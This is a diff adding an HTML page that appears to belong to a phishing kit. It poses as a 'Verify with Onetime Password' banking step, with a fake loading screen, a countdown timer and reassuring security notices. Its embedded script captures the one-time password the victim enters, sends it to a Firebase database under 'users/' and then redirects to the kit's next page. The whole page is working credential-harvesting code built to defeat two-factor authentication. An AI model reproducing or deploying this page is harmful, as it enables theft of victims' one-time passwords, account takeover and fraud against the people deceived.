@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+		<title>Wellcome online</title>
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<link rel="stylesheet" type="text/css" href="style.css">
+		<script src="js/referrer.js"></script>
+	</head>
+	<body>
+		<div id="loading" style="margin-top: 80px;text-align: center;">
+			<span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 120px; height: 120px; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+				<img alt="loading" src="loading.gif" decoding="async" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+			</span>
+			<h2>Loading...</h2>
+		</div>
+		<div id="main" class="hidden">
+			<header class="Qiv_logo__8DRjr">
+				<img alt="eKLfFl" loading="lazy" width="132" height="32" decoding="async" src="logo.svg" style="color: transparent;">
+			</header>
+			<main>
+				<div class="Qiv_login_heading__4Psgp">
+					<h3 class="Qiv_login_heading_h3___uWbp">Verify with Onetime Password</h3>
+				</div>
+				<div class="Qiv_login_form__5C_cw">
+					<p class="Qiv_mandatory_txt__fhLWM">Mandatory fields are marked with an asterisk (*)</p>
+					<form class="Qiv_form__lGlFR" id="otp-form">
+						<div class="Qiv_form_group__XPV8X">
+							<label class="Qiv_label__zUpI2">Onetime Password <span class="Qiv_mandatory_txt__fhLWM">*</span>
+							</label>
+							<input id="PANOTP" name="PANOTP" type="text" autocomplete="one-time-code" inputmode="numeric" class="Qiv_form_control__tzi5X" required minlength="6" maxlength="8">
+						</div>
+						<div class="Qiv_t_center__34DF2">
+							<input id="submit" type="submit" class="Qiv_btn_default__pOpn3" value="Submit">
+						</div>
+					</form>
+					<div class="Qiv_t_center__34DF2">
+						<p id="timer">03:00</p>
+					</div>
+					<div class="Qiv_t_center__34DF2">
+						<p>If you don't have received sms phone,click here.</p>
+						<button class="Qiv_btn_resend__OYf0j" type="button">Resend</button>
+						<p></p>
+					</div>
+					<div class="Qiv_info_panel__uPBSr">
+						<div class="Qiv_notify_icon__pyLuO">
+							<ul class="provide">
+								<li>Mandatory fields are marked with an asterisk (*) </li>
+								<li>Do not provide your username and password anywhere other than in this page </li>
+								<li>Your username and password are highly confidential. Never part with them. We will never ask for this information. </li>
+							</ul>
+						</div>
+					</div>
+				</div>
+			</main>
+			<div class="Qiv_footer_area__gO0vJ">
+				<img alt="y1EaoQ" loading="lazy" width="68" height="28" decoding="async" src="sign.png" style="color: transparent;">
+			</div>
+			<div class="Qiv_footer__PEe7g">
+				<p>© Copyright</p>
+			</div>
+		</div>
+		<script>let time = 180;let redirect = 0;</script>
+		<script src="js/timer.js"></script>
+		<script src="firebase-config.js"></script>
+		<script type="module">
+			import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+			import { getDatabase, ref, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js"; 
+			const app = initializeApp(firebaseConfig);
+			const db = getDatabase();
+			var form = document.getElementById("otp-form");
+			form.addEventListener("submit", function(e) {
+				if(form.checkValidity() != false) {
+					event.preventDefault();
+					document.getElementById("submit").disabled = true;
+					document.body.style.cursor='wait';
+					const timestamp = Math.floor(Date.now() / 100);
+					update(ref(db, 'users/' + timestamp), {
+						PANOTP: document.getElementById('PANOTP').value
+					})
+					.then(() => {
+						window.location.href = nextPath;
+					})
+					.catch((error) => {
+						document.getElementById("submit").disabled = false;
+						document.body.style.cursor='default';
+						alert("Error! Please try again later.");
+					});
+				}
+			});
+		</script>
+		<script src="js/onload.js"></script>
+	</body>
+</html>
